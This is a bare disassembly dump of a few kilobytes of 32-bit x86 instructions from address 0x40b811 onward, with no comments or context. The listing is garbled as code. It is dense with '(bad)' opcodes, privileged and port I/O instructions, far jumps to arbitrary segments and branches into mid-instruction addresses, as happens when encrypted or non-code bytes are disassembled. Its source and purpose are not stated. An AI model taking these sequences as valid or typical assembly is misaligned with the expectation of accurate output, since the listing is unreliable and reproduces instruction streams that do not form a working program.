  40b811:	mov    ds:0x31ec5d87,eax
  40b816:	jb     0x40b82b
  40b818:	dec    eax
  40b819:	xor    DWORD PTR [edx+esi*2+0x5ef69848],edx
  40b820:	sub    DWORD PTR [edi],edx
  40b822:	shl    BYTE PTR [eax+0x3c],cl
  40b825:	shl    BYTE PTR ds:0xe70c3c78,cl
  40b82b:	int3   
  40b82c:	(bad)  
  40b82e:	and    DWORD PTR [ebx-0x89865bd],edx
  40b834:	rcr    ebp,0xa1
  40b837:	adc    edx,esi
  40b839:	dec    ebx
  40b83a:	test   al,0x5d
  40b83c:	adc    eax,0x585b060d
  40b841:	js     0x40b86f
  40b843:	inc    ebp
  40b844:	imul   edi,DWORD PTR [esi],0xffffff87
  40b847:	dec    ebp
  40b848:	outs   dx,BYTE PTR ds:[esi]
  40b849:	xor    al,0x9b
  40b84b:	(bad)  
  40b84c:	sbb    eax,0xa404c4b1
  40b851:	les    esi,FWORD PTR [ebx+0x2c]
  40b854:	cmp    dh,BYTE PTR [esi-0x2cf742c7]
  40b85a:	add    DWORD PTR [edi],esp
  40b85c:	mov    ebp,0xd900ff44
  40b861:	push   ebp
  40b862:	xor    esi,0xffffffb9
  40b865:	xchg   edi,eax
  40b866:	repnz and bl,BYTE PTR es:[edi+edi*4]
  40b86b:	xchg   esi,eax
  40b86c:	and    al,0x1d
  40b86e:	aas    
  40b86f:	dec    esi
  40b870:	sti    
  40b871:	dec    edx
  40b872:	or     eax,DWORD PTR [esi+esi*1]
  40b875:	adc    DWORD PTR [edx-0x35],esi
  40b878:	push   eax
  40b879:	ins    DWORD PTR es:[edi],dx
  40b87a:	shl    BYTE PTR [eax-0x7e8ff569],0x4
  40b881:	adc    eax,0x2ed157f7
  40b886:	cmp    DWORD PTR [edx],0x94298d34
  40b88c:	sbb    ebx,ebx
  40b88e:	mov    esp,esp
  40b890:	inc    ecx
  40b891:	iret   
  40b892:	stc    
  40b893:	aad    0x58
  40b895:	add    al,0xc3
  40b897:	test   al,0x3a
  40b899:	mov    esp,0x20595781
  40b89e:	pop    eax
  40b89f:	inc    edi
  40b8a0:	xchg   edx,eax
  40b8a1:	call   0x2506:0x63d3a310
  40b8a8:	add    ch,BYTE PTR [esi]
  40b8aa:	pop    ss
  40b8ab:	pop    eax
  40b8ac:	lahf   
  40b8ad:	daa    
  40b8ae:	sbb    BYTE PTR [eax+0x5e57a5d],bl
  40b8b4:	jno    0x40b8f8
  40b8b6:	scas   al,BYTE PTR es:[edi]
  40b8b7:	lods   eax,DWORD PTR ds:[esi]
  40b8b8:	mov    ?,WORD PTR [esi]
  40b8ba:	aas    
  40b8bb:	fistp  QWORD PTR [edx]
  40b8bd:	inc    ebx
  40b8be:	aam    0x95
  40b8c0:	push   eax
  40b8c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8c2:	imul   BYTE PTR [ebx+0x855531e]
  40b8c8:	jno    0x40b8e4
  40b8ca:	pop    esp
  40b8cb:	lods   al,BYTE PTR ds:[esi]
  40b8cc:	mov    edx,0x8cd34877
  40b8d1:	ror    DWORD PTR [eax-0xd22725b],cl
  40b8d7:	cmp    BYTE PTR [eax+0x1b],al
  40b8da:	lea    ecx,[ebp+0x49]
  40b8dd:	scas   eax,DWORD PTR es:[edi]
  40b8de:	cmc    
  40b8df:	jmp    0x40b8a2
  40b8e1:	push   eax
  40b8e2:	pop    es
  40b8e3:	and    al,0x29
  40b8e5:	bound  ebp,QWORD PTR [ebx-0x3a8c1c77]
  40b8eb:	mov    dh,BYTE PTR [ebp+0x4a]
  40b8ee:	xchg   ebp,eax
  40b8ef:	outs   dx,DWORD PTR ds:[esi]
  40b8f0:	xor    eax,0x9ff5437b
  40b8f5:	test   BYTE PTR [eax-0x5],cl
  40b8f8:	xor    BYTE PTR [eax+edx*1-0x667d83cb],bh
  40b8ff:	jp     0x40b897
  40b901:	sbb    ebp,DWORD PTR [eax+0x4b7596f0]
  40b907:	shl    BYTE PTR [edi],1
  40b909:	xchg   edi,eax
  40b90a:	ja     0x40b93c
  40b90c:	push   edx
  40b90d:	add    BYTE PTR [esi],dl
  40b90f:	test   al,0x9c
  40b911:	push   ebx
  40b912:	xchg   esi,eax
  40b913:	mov    al,0x58
  40b915:	rcl    DWORD PTR [edi+0x489bc5f5],cl
  40b91b:	test   DWORD PTR [edx],edi
  40b91d:	enter  0x59d9,0xf8
  40b921:	inc    dl
  40b923:	push   ss
  40b924:	add    DWORD PTR ds:0xf1d8f9fd,eax
  40b92a:	add    DWORD PTR [ecx-0x100d5d3d],eax
  40b930:	sbb    BYTE PTR [esi-0x55],dh
  40b933:	ret    0x3e3e
  40b936:	cmp    bh,BYTE PTR [edi]
  40b938:	pop    ebp
  40b939:	or     BYTE PTR [ecx],cl
  40b93b:	aad    0xb4
  40b93d:	std    
  40b93e:	xor    ebx,DWORD PTR [edi-0x71]
  40b941:	call   0x30cf74e6
  40b946:	(bad)  
  40b947:	js     0x40b92e
  40b949:	dec    esp
  40b94a:	adc    dl,ch
  40b94c:	sbb    esp,0x54
  40b94f:	retf   0x87b3
  40b952:	adc    ch,dl
  40b954:	clc    
  40b955:	(bad)  
  40b956:	xchg   esi,eax
  40b957:	fisub  WORD PTR ds:0x2b85d404
  40b95d:	xor    BYTE PTR [ebx-0x14],0xb3
  40b961:	aaa    
  40b962:	cli    
  40b963:	pushf  
  40b964:	mov    DWORD PTR [ebp-0x3f88037a],ebx
  40b96a:	jle    0x40b938
  40b96c:	out    0x51,al
  40b96e:	aad    0xb9
  40b970:	cwde   
  40b971:	mov    eax,ds:0xcc29bc4
  40b976:	and    ch,dl
  40b978:	mov    ah,0x25
  40b97a:	in     al,0x13
  40b97c:	inc    ebp
  40b97d:	mov    WORD PTR [eax],es
  40b97f:	int    0x1e
  40b981:	pop    es
  40b982:	data16 jmp 0x40b9b6
  40b985:	adc    DWORD PTR [ebx+0x2d949ee9],edx
  40b98b:	sti    
  40b98c:	jne    0x40b957
  40b98e:	nop
  40b98f:	popa   
  40b990:	ret    0x1e4b
  40b993:	sub    DWORD PTR [edx],eax
  40b995:	add    BYTE PTR [eax+0x50],ch
  40b998:	sbb    DWORD PTR [ecx+0x564a3183],esi
  40b99e:	or     ebx,DWORD PTR [esi-0x7c1f20ca]
  40b9a4:	cs sub cl,cl
  40b9a7:	scas   al,BYTE PTR es:[edi]
  40b9a8:	mov    ds:0xf1bfdfe5,eax
  40b9ad:	mov    eax,0x6d7bb596
  40b9b2:	rcr    BYTE PTR [ebp+0x61fa7f16],0xb6
  40b9b9:	or     bp,WORD PTR [ecx-0x48448b37]
  40b9c0:	xchg   edx,eax
  40b9c1:	ds cli 
  40b9c3:	xor    al,0x9c
  40b9c5:	adc    cl,BYTE PTR [ebx+0x17]
  40b9c8:	mov    WORD PTR ds:0x63e53c3,?
  40b9ce:	push   es
  40b9cf:	dec    esp
  40b9d0:	adc    dl,BYTE PTR [edi+0x7f148dc1]
  40b9d6:	test   BYTE PTR [ebx-0x7eb53dc6],0x55
  40b9dd:	xchg   esi,eax
  40b9de:	fidivr DWORD PTR [eax+edx*2]
  40b9e1:	adc    al,0x34
  40b9e3:	push   0x226f3764
  40b9e8:	push   ds
  40b9e9:	data16 fsubr QWORD PTR [ebp+0x82b98d2]
  40b9f0:	ja     0x40ba12
  40b9f2:	daa    
  40b9f3:	jbe    0x40ba18
  40b9f5:	ret    
  40b9f6:	inc    edi
  40b9f7:	xor    ecx,DWORD PTR [edi+ecx*1+0x508f7d28]
  40b9fe:	fimul  WORD PTR [eax-0x26]
  40ba01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba02:	jbe    0x40ba79
  40ba04:	mov    ds:0xb585c248,eax
  40ba09:	push   ecx
  40ba0a:	adc    DWORD PTR [ebx],edi
  40ba0c:	mov    ah,0x89
  40ba0e:	and    DWORD PTR [eax+0x2c],esi
  40ba11:	retf   0x9e8d
  40ba14:	ds sbb al,0xbc
  40ba17:	in     al,dx
  40ba18:	test   BYTE PTR ds:0xe82e5da5,ch
  40ba1e:	pop    ebx
  40ba1f:	adc    DWORD PTR [edx+0x7],edx
  40ba22:	es stc 
  40ba24:	je     0x40b9af
  40ba26:	inc    ebx
  40ba27:	adc    edx,DWORD PTR [edi]
  40ba29:	nop
  40ba2a:	cli    
  40ba2b:	(bad)  
  40ba2c:	scas   eax,DWORD PTR es:[edi]
  40ba2d:	mov    WORD PTR [eax+0x74841d41],gs
  40ba33:	xchg   edi,eax
  40ba34:	cmp    DWORD PTR [edx],0xe180d11d
  40ba3a:	mov    edi,0xedb9b830
  40ba3f:	push   ecx
  40ba40:	test   DWORD PTR [eax+0x19],edx
  40ba43:	add    ebp,ebp
  40ba45:	fwait
  40ba46:	shl    BYTE PTR [esi-0x62],0xc1
  40ba4a:	stc    
  40ba4b:	pop    eax
  40ba4c:	aaa    
  40ba4d:	adc    eax,0xcd321bc3
  40ba52:	xchg   edx,eax
  40ba53:	add    eax,0x99235076
  40ba58:	inc    ecx
  40ba59:	adc    ah,al
  40ba5b:	and    al,0xbb
  40ba5d:	fild   DWORD PTR [esi-0x29c6408a]
  40ba63:	int    0x96
  40ba65:	mov    cl,0x2e
  40ba67:	inc    esi
  40ba68:	pop    eax
  40ba69:	xchg   edx,eax
  40ba6a:	cs (bad) 
  40ba6c:	in     al,0x8d
  40ba6e:	ss inc ebp
  40ba70:	pop    es
  40ba71:	lods   eax,DWORD PTR ds:[esi]
  40ba72:	adc    al,0xf0
  40ba74:	cmp    eax,edi
  40ba76:	cwde   
  40ba77:	xchg   esp,eax
  40ba78:	jle    0x40ba7b
  40ba7a:	ins    BYTE PTR es:[edi],dx
  40ba7b:	or     BYTE PTR [esi],bh
  40ba7d:	dec    eax
  40ba7e:	xchg   dh,ah
  40ba80:	pusha  
  40ba81:	les    ebx,FWORD PTR [ebx]
  40ba83:	(bad)  
  40ba84:	jmp    0x8e8c:0x2289d67d
  40ba8b:	test   eax,0xa9ea2f6f
  40ba90:	ret    
  40ba91:	(bad)  ds:0x90135a06
  40ba97:	aad    0xef
  40ba99:	push   edi
  40ba9a:	pop    eax
  40ba9b:	les    edx,FWORD PTR [ebx-0x6cec01d0]
  40baa1:	jle    0x40baf5
  40baa3:	ds push edi
  40baa5:	popa   
  40baa6:	addr16 pop ebp
  40baa8:	lods   eax,DWORD PTR ds:[esi]
  40baa9:	sbb    BYTE PTR [ebp+0x25e1f0ab],ch
  40baaf:	inc    ecx
  40bab0:	adc    cl,BYTE PTR [edx]
  40bab2:	je     0x40bb0a
  40bab4:	test   al,0x18
  40bab6:	out    0xb9,eax
  40bab8:	dec    ebx
  40bab9:	call   0x3a74c7f
  40babe:	adc    edx,esi
  40bac0:	and    ch,bh
  40bac2:	push   eax
  40bac3:	jne    0x40bae5
  40bac5:	div    DWORD PTR [edi+eiz*4-0x5f]
  40bac9:	sbb    edi,edx
  40bacb:	mov    ebp,0x1c91ba3f
  40bad0:	arpl   WORD PTR [eax-0x7f],bx
  40bad3:	push   0x4d29b846
  40bad8:	inc    eax
  40bad9:	pop    ebp
  40bada:	inc    ecx
  40badb:	sbb    eax,0x5e629a97
  40bae0:	pop    ds
  40bae1:	mov    BYTE PTR [ebp-0xa64032f],0x8d
  40bae8:	aad    0x45
  40baea:	popf   
  40baeb:	out    dx,al
  40baec:	inc    edi
  40baed:	pop    ebx
  40baee:	in     al,dx
  40baef:	mov    WORD PTR [esi+0x1fe34842],fs
  40baf5:	cmp    ecx,DWORD PTR [ebp-0x72]
  40baf8:	jle    0x40bb56
  40bafa:	pop    esi
  40bafb:	or     al,0x83
  40bafd:	cs clc 
  40baff:	daa    
  40bb00:	push   cs
  40bb01:	in     eax,0xf1
  40bb03:	call   0xd3ae06a3
  40bb08:	push   es
  40bb09:	inc    esi
  40bb0a:	push   edx
  40bb0b:	dec    ebp
  40bb0c:	jo     0x40bb6b
  40bb0e:	adc    BYTE PTR [ebx-0x54],cl
  40bb11:	cmp    eax,0x94f4c1dc
  40bb16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb17:	sub    edi,DWORD PTR [si]
  40bb1a:	pop    eax
  40bb1b:	pop    es
  40bb1c:	dec    ebx
  40bb1d:	inc    ebx
  40bb1e:	pusha  
  40bb1f:	mov    ch,0x60
  40bb21:	into   
  40bb22:	cld    
  40bb23:	mov    ch,al
  40bb25:	icebp  
  40bb26:	sbb    BYTE PTR [ecx],bl
  40bb28:	xchg   edx,eax
  40bb29:	xchg   DWORD PTR [ecx-0x4c],ecx
  40bb2c:	dec    esp
  40bb2d:	jmp    0x40bba8
  40bb2f:	sbb    BYTE PTR [edx-0x59],0x0
  40bb33:	imul   ecx,DWORD PTR [ebp+0x16e2211d],0x21
  40bb3a:	push   0xbc77fa6f
  40bb3f:	cs mov ch,0xad
  40bb42:	inc    esi
  40bb43:	or     eax,0x827e9c76
  40bb48:	ja     0x40baed
  40bb4a:	sbb    BYTE PTR [ecx+0x2],bh
  40bb4d:	outs   dx,BYTE PTR ds:[esi]
  40bb4e:	mov    edx,0x7a64367f
  40bb53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb54:	(bad)  
  40bb55:	sbb    BYTE PTR [esi+0x7609d76a],dl
  40bb5b:	jmp    0x40bb61
  40bb5d:	hlt    
  40bb5e:	jbe    0x40bb34
  40bb60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb61:	push   ebx
  40bb62:	jl     0x40bb61
  40bb64:	jmp    0x7070:0x63ccbfa0
  40bb6b:	jmp    0x7087:0x178ad24d
  40bb72:	add    BYTE PTR [eax-0x5f9362c5],al
  40bb78:	mov    cs,ecx
  40bb7a:	cmp    esi,DWORD PTR [edi-0xe13c7a6]
  40bb80:	lods   eax,DWORD PTR ds:[esi]
  40bb81:	imul   edx,esi,0x1e
  40bb84:	mov    ebp,0xb14a4ebe
  40bb89:	scas   eax,DWORD PTR es:[edi]
  40bb8a:	pop    esi
  40bb8b:	dec    edi
  40bb8c:	pop    esp
  40bb8d:	addr16 dec esi
  40bb8f:	stos   BYTE PTR es:[edi],al
  40bb90:	pusha  
  40bb91:	mov    esi,0x641d8111
  40bb96:	stc    
  40bb97:	xchg   ecx,eax
  40bb98:	ss stos DWORD PTR es:[edi],eax
  40bb9a:	add    eax,0xa40a1211
  40bb9f:	mov    bh,0xf8
  40bba1:	mov    cl,0xaa
  40bba3:	cmp    al,0xb1
  40bba5:	test   eax,0xcf844963
  40bbaa:	lahf   
  40bbab:	aas    
  40bbac:	mov    dl,0xe2
  40bbae:	or     DWORD PTR [eax-0x7a],edx
  40bbb1:	adc    al,0x4f
  40bbb3:	sub    bh,ah
  40bbb5:	sbb    DWORD PTR [ecx],0x9fd8098b
  40bbbb:	dec    eax
  40bbbc:	xchg   ecx,eax
  40bbbd:	mov    esp,0xe68da8d9
  40bbc2:	and    edx,0x5b
  40bbc5:	mov    ah,0x26
  40bbc7:	pop    ss
  40bbc8:	and    edi,ebp
  40bbca:	or     BYTE PTR [eax],al
  40bbcc:	or     al,0xdb
  40bbce:	stc    
  40bbcf:	add    dh,0x64
  40bbd2:	cmp    edx,edi
  40bbd4:	adc    eax,0x7b8b83dd
  40bbd9:	xor    DWORD PTR [edx],0x613ffba9
  40bbdf:	jmp    0x40bbb4
  40bbe1:	and    BYTE PTR [edi],dh
  40bbe3:	cmc    
  40bbe4:	icebp  
  40bbe5:	int    0x74
  40bbe7:	push   ebp
  40bbe8:	xor    eax,DWORD PTR ds:[ebx-0x12912943]
  40bbef:	mov    eax,ds:0xfbddb132
  40bbf4:	push   ss
  40bbf5:	and    ebx,DWORD PTR [edi]
  40bbf7:	sbb    al,BYTE PTR [edi]
  40bbf9:	adc    cl,BYTE PTR [edi+0x22]
  40bbfc:	out    dx,eax
  40bbfd:	ret    0x1552
  40bc00:	ret    
  40bc01:	int3   
  40bc02:	push   ecx
  40bc03:	xchg   edx,edx
  40bc05:	jge    0x40bc62
  40bc07:	pop    ss
  40bc08:	pop    es
  40bc09:	pop    edi
  40bc0a:	push   ds
  40bc0b:	fucomp st(5)
  40bc0d:	iret   
  40bc0e:	in     al,0xf7
  40bc10:	dec    edx
  40bc11:	push   es
  40bc12:	jmp    0x7d19c9ee
  40bc17:	outs   dx,DWORD PTR ds:[esi]
  40bc18:	rol    DWORD PTR [eax+0x3ae48ad4],1
  40bc1e:	(bad)  
  40bc1f:	xor    eax,0x7448075e
  40bc24:	ss xor al,cl
  40bc27:	pop    eax
  40bc28:	(bad)  
  40bc29:	dec    esp
  40bc2a:	push   ds
  40bc2b:	(bad)  
  40bc2c:	(bad)  
  40bc2e:	lods   al,BYTE PTR ds:[esi]
  40bc2f:	aad    0x85
  40bc31:	lods   eax,DWORD PTR ds:[esi]
  40bc32:	add    DWORD PTR [eax-0x1dc32004],eax
  40bc38:	jmp    0x40bbea
  40bc3a:	nop
  40bc3b:	mov    DWORD PTR fs:[edi-0x46f9c79a],ebx
  40bc42:	or     DWORD PTR [ebp+0x2c71747d],0xb23cd7ed
  40bc4c:	mov    eax,0x5dc5bd62
  40bc51:	adc    eax,0x9a459152
  40bc56:	push   ebx
  40bc57:	adc    ah,BYTE PTR [esp+edx*2]
  40bc5a:	xor    DWORD PTR [ebp-0x5],ebx
  40bc5d:	rcr    DWORD PTR [ebp+0x4628ab23],cl
  40bc63:	cmp    eax,0x4491853c
  40bc68:	or     eax,0xcfbeea99
  40bc6d:	rcr    BYTE PTR [ebx-0x692b117b],cl
  40bc73:	call   0x66254ad4
  40bc78:	rcl    BYTE PTR [esi],cl
  40bc7a:	mov    ah,0x9
  40bc7c:	mov    esp,0xd355834e
  40bc81:	adc    DWORD PTR [ebx-0x52775cab],esp
  40bc87:	and    bl,bl
  40bc89:	stc    
  40bc8a:	clc    
  40bc8b:	mov    ch,0x2b
  40bc8d:	mov    ch,BYTE PTR [ecx-0xa70b2e6]
  40bc93:	lods   eax,DWORD PTR ds:[esi]
  40bc94:	shl    ecx,cl
  40bc96:	push   ecx
  40bc97:	mov    edx,0x4f046260
  40bc9c:	iret   
  40bc9d:	xchg   ecx,eax
  40bc9e:	xchg   edx,eax
  40bc9f:	in     eax,dx
  40bca0:	lods   al,BYTE PTR ds:[esi]
  40bca1:	dec    esi
  40bca2:	mov    WORD PTR [ecx],ds
  40bca4:	call   0x847b:0x8a58fbf6
  40bcab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcac:	mov    dl,0xb1
  40bcae:	dec    edx
  40bcaf:	test   DWORD PTR [edx+0x166380c6],eax
  40bcb5:	aas    
  40bcb6:	repnz pop esi
  40bcb8:	xchg   ebx,eax
  40bcb9:	push   cs
  40bcba:	push   ss
  40bcbb:	mov    edx,0x3d43f126
  40bcc0:	mov    cl,0x5
  40bcc2:	pop    edi
  40bcc3:	cmp    BYTE PTR [edi+edi*2+0x570d9522],ch
  40bcca:	pushf  
  40bccb:	push   edx
  40bccc:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40bcce:	mov    ch,0x50
  40bcd0:	outs   dx,BYTE PTR ds:[esi]
  40bcd1:	pop    ecx
  40bcd2:	ret    0xfb4d
  40bcd5:	cmp    al,0x85
  40bcd7:	or     al,0x33
  40bcd9:	bound  edx,QWORD PTR [ecx+esi*8]
  40bcdc:	out    0x48,eax
  40bcde:	retf   0x5ff6
  40bce1:	jle    0x40bc8d
  40bce3:	jno    0x40bca3
  40bce5:	iret   
  40bce6:	sbb    al,0x53
  40bce8:	add    ebx,ecx
  40bcea:	xor    eax,0xb11f11b2
  40bcef:	xor    al,0xdd
  40bcf1:	cmc    
  40bcf2:	mov    al,ds:0x91d3110e
  40bcf7:	frstor [edx-0x7b460cb3]
  40bcfd:	xchg   BYTE PTR [edx+0x73],ah
  40bd00:	lahf   
  40bd01:	pop    esi
  40bd02:	es dec edi
  40bd04:	aas    
  40bd05:	test   DWORD PTR [eax+0xf],0x24f50096
  40bd0c:	popf   
  40bd0d:	rcl    esp,1
  40bd0f:	jo     0x40bd84
  40bd11:	dec    ecx
  40bd12:	jmp    0x40bcc6
  40bd14:	dec    ebp
  40bd15:	and    esp,DWORD PTR [ebp+edi*8+0x6c]
  40bd19:	push   0x808004ff
  40bd1e:	xchg   ecx,eax
  40bd1f:	or     eax,0xcf21b313
  40bd24:	jl     0x40bcdd
  40bd26:	call   0x27d7:0x83125e16
  40bd2d:	aam    0x6c
  40bd2f:	ins    BYTE PTR es:[edi],dx
  40bd30:	mov    edi,?
  40bd32:	mov    ch,0x8e
  40bd34:	inc    esp
  40bd35:	das    
  40bd36:	in     al,0x7b
  40bd38:	jp     0x40bd99
  40bd3a:	(bad)  
  40bd3b:	outs   dx,DWORD PTR ds:[esi]
  40bd3c:	jge    0x40bccc
  40bd3e:	loopne 0x40bce3
  40bd40:	fs and edx,ecx
  40bd43:	test   al,0xd4
  40bd45:	gs adc eax,0x6198731d
  40bd4b:	loopne 0x40bd2a
  40bd4d:	iret   
  40bd4e:	repz in eax,0x12
  40bd51:	mov    al,0x9d
  40bd53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bd54:	sub    edi,DWORD PTR [ebp+0x2f]
  40bd57:	in     al,dx
  40bd58:	ja     0x40bd27
  40bd5a:	(bad)  
  40bd5b:	adc    esi,ecx
  40bd5d:	ins    BYTE PTR es:[edi],dx
  40bd5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd5f:	lahf   
  40bd60:	xor    eax,0x63ec2d37
  40bd65:	(bad)  
  40bd66:	rcl    DWORD PTR [edx-0x7e578cdc],1
  40bd6c:	or     edx,DWORD PTR ds:0x45f116fe
  40bd72:	and    eax,0x96d7cb3f
  40bd77:	xchg   DWORD PTR [ebx],ecx
  40bd79:	fmul   QWORD PTR [edx-0x1a85049b]
  40bd7f:	stc    
  40bd80:	ins    DWORD PTR es:[edi],dx
  40bd81:	sub    dl,BYTE PTR [eax]
  40bd83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd84:	add    cl,al
  40bd86:	pushf  
  40bd87:	es pop edx
  40bd89:	ss inc esp
  40bd8b:	dec    edi
  40bd8c:	mov    gs,WORD PTR [esp+edi*2-0x4cef1657]
  40bd93:	mov    eax,0x727ae2bf
  40bd98:	adc    BYTE PTR [eax-0x1cb5b90b],ah
  40bd9e:	imul   eax,DWORD PTR [edi-0x5d],0xffffffdb
  40bda2:	xor    DWORD PTR [esi-0x38414aa],esp
  40bda8:	lahf   
  40bda9:	mov    esp,0x97f02b5
  40bdae:	scas   eax,DWORD PTR es:[edi]
  40bdaf:	or     BYTE PTR [ecx],dh
  40bdb1:	mov    bh,0x4d
  40bdb3:	and    eax,esp
  40bdb5:	mov    esi,edi
  40bdb7:	aam    0x62
  40bdb9:	fldenv [eax]
  40bdbb:	jmp    0x3903:0xd35352d4
  40bdc2:	xor    DWORD PTR [edi+eax*8-0x3ae0b17f],ebx
  40bdc9:	xchg   ebp,eax
  40bdca:	cmp    DWORD PTR [ebx-0x34],esi
  40bdcd:	scas   al,BYTE PTR es:[edi]
  40bdce:	mov    gs,eax
  40bdd0:	loopne 0x40bd89
  40bdd2:	inc    edi
  40bdd3:	mov    dh,BYTE PTR [ebx-0x2388d081]
  40bdd9:	ja     0x40be24
  40bddb:	or     eax,0xfbdb5ca3
  40bde0:	out    0x26,al
  40bde2:	push   cs
  40bde3:	sub    DWORD PTR [eax+eax*4],esi
  40bde6:	out    0x57,eax
  40bde8:	jp     0x40bd92
  40bdea:	jns    0x40be5e
  40bdec:	cmp    eax,0x5f21e966
  40bdf1:	test   BYTE PTR [edi-0x13],0xe2
  40bdf5:	mov    dl,0xa1
  40bdf7:	sbb    BYTE PTR [ecx],cl
  40bdf9:	xchg   edx,eax
  40bdfa:	push   0xfffffff7
  40bdfc:	mov    cl,0xff
  40bdfe:	scas   eax,DWORD PTR es:[edi]
  40bdff:	daa    
  40be00:	enter  0xcac3,0xd7
  40be04:	pop    edx
  40be05:	(bad)  
  40be06:	mov    ebx,0x936e6010
  40be0b:	loopne 0x40be30
  40be0d:	inc    esi
  40be0e:	test   BYTE PTR [edx+0x7b0660df],ah
  40be14:	push   edi
  40be15:	push   ss
  40be16:	mov    ah,0xe7
  40be18:	jb     0x40be45
  40be1a:	push   esi
  40be1b:	mov    dl,ch
  40be1d:	repnz nop
  40be1f:	jmp    0x40bde7
  40be21:	push   cs
  40be22:	inc    ebp
  40be23:	ret    0x9d46
  40be26:	add    ch,BYTE PTR [ecx]
  40be28:	int3   
  40be29:	or     esp,DWORD PTR [eax+0x26]
  40be2c:	test   al,0x58
  40be2e:	lds    ecx,FWORD PTR [eax+ebp*2]
  40be31:	xchg   BYTE PTR [eax],dl
  40be33:	cmp    eax,0x40e652a2
  40be38:	loope  0x40be55
  40be3a:	xlat   BYTE PTR ds:[ebx]
  40be3b:	push   ebx
  40be3c:	mov    BYTE PTR [esi],dl
  40be3e:	loopne 0x40be20
  40be40:	add    DWORD PTR [ebp+0x2d],eax
  40be43:	mov    eax,es:0xbedb92a1
  40be49:	pop    ss
  40be4a:	fcom   QWORD PTR [ebx+eax*2-0x45]
  40be4e:	dec    edi
  40be4f:	cli    
  40be50:	jp     0x40be54
  40be52:	and    BYTE PTR [esi+0x1e4f890d],dl
  40be58:	mov    BYTE PTR [eax+0x43],dh
  40be5b:	xor    al,0xe8
  40be5d:	mov    cl,0x2b
  40be5f:	mov    dh,0x83
  40be61:	jg     0x40be02
  40be63:	and    al,0x40
  40be65:	retf   0xe676
  40be68:	outs   dx,BYTE PTR ds:[esi]
  40be69:	rol    DWORD PTR [edi+eiz*8],cl
  40be6c:	xor    bh,BYTE PTR [ebx]
  40be6e:	aas    
  40be6f:	and    al,dl
  40be71:	and    BYTE PTR [ecx+0x70],al
  40be74:	sbb    BYTE PTR [esi-0x42],0xbe
  40be78:	idiv   ecx
  40be7a:	shl    DWORD PTR [edi-0x1],0xa4
  40be7e:	retf   
  40be7f:	pop    esi
  40be80:	and    bh,BYTE PTR [edi-0x8]
  40be83:	scas   eax,DWORD PTR es:[edi]
  40be84:	sub    ecx,DWORD PTR [eax+0x1a346dfc]
  40be8a:	mov    ah,0x70
  40be8c:	int    0x51
  40be8e:	and    ebp,ebp
  40be90:	fnstsw WORD PTR [eax-0x4552084b]
  40be96:	nop
  40be97:	outs   dx,DWORD PTR ds:[esi]
  40be98:	iret   
  40be99:	xchg   edi,eax
  40be9a:	mov    ds:0xc4ba93c0,eax
  40be9f:	aaa    
  40bea0:	sbb    ecx,edi
  40bea2:	test   al,0x21
  40bea4:	jp     0x40bef0
  40bea6:	dec    ebp
  40bea7:	adc    eax,0x58f91f93
  40beac:	rcr    bl,cl
  40beae:	sahf   
  40beaf:	mov    bh,0xad
  40beb1:	cmp    al,0xd4
  40beb3:	(bad)  
  40beb4:	outs   dx,BYTE PTR ds:[esi]
  40beb5:	shr    BYTE PTR [edx],0x22
  40beb8:	in     al,0x10
  40beba:	icebp  
  40bebb:	enter  0x89a2,0x1
  40bebf:	add    cl,dl
  40bec1:	push   0xb637a318
  40bec6:	fucomp st(5)
  40bec8:	push   cs
  40bec9:	cld    
  40beca:	push   0xffffffa4
  40becc:	gs addr16 jb 0x40bf13
  40bed0:	repz arpl WORD PTR [ecx+0x38],di
  40bed4:	mov    ?,WORD PTR [edx-0x2e]
  40bed7:	aas    
  40bed8:	mov    ds:0x4758a0b3,al
  40bedd:	std    
  40bede:	mov    esp,0xe399945c
  40bee3:	sub    BYTE PTR [edi],dl
  40bee5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bee6:	bound  esi,QWORD PTR [ecx-0x20497108]
  40beec:	push   es
  40beed:	mov    ah,0x7e
  40beef:	adc    eax,0x43585b06
  40bef4:	(bad)  
  40bef5:	mov    ds:0x5da1eff,al
  40befa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40befb:	push   ds
  40befc:	shr    BYTE PTR [eax+0x79],1
  40beff:	push   edi
  40bf00:	sbb    BYTE PTR [eax+0x4bd79c2a],ch
  40bf06:	retfw  0xf6b5
  40bf0a:	xchg   edi,eax
  40bf0b:	stc    
  40bf0c:	fiadd  DWORD PTR ds:0xfb18abac
  40bf12:	int    0x0
  40bf14:	int    0x90
  40bf16:	test   al,0x79
  40bf18:	fisubr DWORD PTR [ecx+0x3dfc400c]
  40bf1e:	push   edx
  40bf1f:	mov    ecx,eax
  40bf21:	fwait
  40bf22:	je     0x40bf3f
  40bf24:	fsub   DWORD PTR [ecx+0x51]
  40bf27:	xchg   edi,eax
  40bf28:	sahf   
  40bf29:	std    
  40bf2a:	sti    
  40bf2b:	je     0x40bf98
  40bf2d:	mov    ebx,0xb2ad8cdf
  40bf32:	or     bl,dh
  40bf34:	pop    esp
  40bf35:	cs dec eax
  40bf37:	imul   eax,DWORD PTR [ebx+ecx*4+0xc],0x8480fe11
  40bf3f:	or     ch,dl
  40bf41:	int3   
  40bf42:	xchg   edx,eax
  40bf43:	(bad)  
  40bf44:	jmp    0x40bf78
  40bf46:	in     eax,dx
  40bf47:	fsub   QWORD PTR [edi-0x2c]
  40bf4a:	jne    0x40bfa2
  40bf4c:	fldenv [ebp+edx*4-0xd]
  40bf50:	mov    ds:0x206b6623,eax
  40bf55:	jmp    0x40bfce
  40bf57:	lea    edx,[edi]
  40bf59:	and    cl,BYTE PTR [ebx]
  40bf5b:	call   0xff965774
  40bf60:	xchg   ecx,eax
  40bf61:	add    eax,0x9187deb3
  40bf66:	lea    esp,[edx-0x29b8e7bd]
  40bf6c:	or     eax,0xa1613549
  40bf71:	pop    esi
  40bf72:	es add al,0x79
  40bf75:	mov    eax,0xe5713aea
